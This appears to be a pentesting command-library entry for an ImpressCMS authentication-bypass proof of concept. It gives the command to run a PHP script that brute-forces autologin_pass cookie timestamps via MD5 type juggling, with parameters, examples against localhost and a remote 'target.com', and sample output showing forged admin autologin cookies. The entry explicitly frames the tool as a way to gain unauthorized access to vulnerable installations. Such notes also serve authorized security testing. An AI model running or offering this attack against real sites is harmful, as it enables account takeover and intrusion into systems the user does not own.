---
data: 'php auth-bypass.php http://localhost/impresscms/ admin'
tags:
  - exploit
  - php
  - auth-bypass
type: command
output: |-
  [-] Starting authentication bypass attack...
  [-] 2021-01-20 022141
  [-] You can autologin with the following cookies:
  [-] Cookie: autologin_uname=admin; autologin_pass=2021-01-20 022141:0
executor: bash
platforms:
  - Linux
  - macOS
  - Windows
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:31:10.873Z'
id: 8c1c1f5b-5a81-4cfa-94e7-559bef2826fe
verified: false
validated: true
submitted: true
---
# run-impresscms-auth-bypass-poc

## Command

```bash
php auth-bypass.php <target_url> <username>
```

## Description

Executes a custom PHP PoC script to brute-force timestamps in autologin_pass cookies, exploiting MD5 type juggling in ImpressCMS for authentication bypass. Use when targeting vulnerable ImpressCMS installations to gain unauthorized access.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| `<target_url>` | Full URL to ImpressCMS installation (e.g., http://localhost/impresscms/) | Yes |
| `<username>` | Target username to impersonate (e.g., admin) | Yes |

## Examples

### Basic Usage

```bash
php auth-bypass.php http://localhost/impresscms/ admin
```

### Advanced Usage

Run against remote host:

```bash
php auth-bypass.php https://target.com/impresscms/ user
```

## Expected Output

Progress logs with timestamps, ending in success message providing exploitable cookies, e.g., "[-] You can autologin with the following cookies: [-] Cookie: autologin_uname=admin; autologin_pass=2021-01-20 022141:0". Failure may loop indefinitely without collision.

## Related

- [[procedures/Brute-Force-Timestamps-with-Auth-Bypass-POC]]
- [[ImpressCMS Authentication Bypass via MD5 Type Juggling in Autologin Feature]]
